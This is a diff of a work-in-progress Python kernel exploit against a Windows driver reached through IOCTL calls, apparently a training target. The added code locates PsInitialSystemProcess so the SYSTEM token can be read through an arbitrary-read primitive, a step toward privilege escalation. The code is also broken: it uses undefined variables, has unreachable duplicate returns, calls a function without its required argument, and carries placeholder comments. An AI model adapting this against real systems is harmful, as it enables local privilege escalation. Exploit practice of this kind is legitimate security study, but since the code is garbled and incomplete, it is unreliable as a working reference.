@@ -134,6 +134,26 @@ def getkernelBase(driver_handle, what=None, where=None):
             return (img_name, kernel_base)
     counter += sizeof(tmp)
 
+########################################### CALCULATE OFFSETS FROM KERNEL #############################################
+def get_PsISP_kernel_address(kernel_base):     
+    # Load kernel image in userland and get PsInitialSystemProcess offset
+    kernel32.LoadLibraryA.restype = HMODULE #I have no fucking idea what HMODULE is
+    hKernelImage = kernel32.LoadLibraryA(kernel_base)
+    debug_print("[+] Loading %s in Userland" % kernel_base)
+    debug_print("[+] %s Userland Base Address : 0x%X" % (kernel_base, hKernelImage))
+    kernel32.GetProcAddress.restype = c_ulonglong
+    kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
+    PsISP_user_address = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
+    debug_print("[+] PsInitialSystemProcess Userland Base Address: 0x%X" % PsISP_user_address)
+    
+    # Calculate PsInitialSystemProcess offset in kernel land
+    system_kernel_base_pointer = kernel_image_base + ( PsISP_user_address - hKernelImage)
+    debug_print("[+] PsInitialSystemProcess Kernel Base Address: 0x%X" % PsISP_kernel_address_ptr)
+    
+    PsISP_kernel_address = c_ulonglong()
+    
+    return system_kernel_base_pointer
+
 ################################################### WRITE ###########################################################
 def writePrimitive(driver, what=None, where=None):
     what_addr = 0x000000001a001000
@@ -181,11 +201,10 @@ def writePrimitive(driver, what=None, where=None):
             POINTER(c_ulonglong))[0]
     return triggerIOCTL
 ################################################### READ ###########################################################
-def readPrimitive(driver, , where=None):
+def readPrimitive(driver, system_kernel_base_pointer, where=None):
 
     #We've created a block of memory at the top of userland via dwStatus
-
-    what_addr = kernelbase + some shit #some shit here system token address
+    what_addr = system_kernel_base_pointer #some shit here system token address
     where = 0x000000001a001000
 
     IoControlCode = 0x0022200B
@@ -210,10 +229,12 @@ def readPrimitive(driver, , where=None):
         NULL,
         )
     
-    #Will this read our token then?
     print 'Value after: %08x' % cast(0x000000001a001000,
             POINTER(c_ulonglong))[0]
+    read_value = cast(0x000000001a001000,
+            POINTER(c_ulonglong))[0]
     return triggerIOCTL
+    return read_value
 
 ########################################### MAIN ##############################################
 def executeOverwrite():
@@ -232,9 +253,8 @@ def executeOverwrite():
     else:
         print '[X] Got handle to the driver.\n'
 
-        writeQWORD(driver_handle, 0x4142434445464748,
-                   0x000000001a002000)
         getkernelBase(driver_handle)
+        get_PsISP_kernel_address()
 
 ############################################ RUN ################################################
 executeOverwrite()
